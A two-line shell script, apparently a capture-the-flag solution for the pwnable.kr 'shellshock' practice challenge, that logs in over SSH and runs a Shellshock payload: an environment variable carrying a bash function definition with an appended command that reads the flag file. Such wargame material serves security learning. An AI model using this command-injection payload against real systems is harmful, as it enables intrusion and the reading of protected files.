#!/usr/bin/env sh

ssh -p2222 shellshock@pwnable.kr 'env x="() { :;}; /bin/cat flag" ./shellshock'
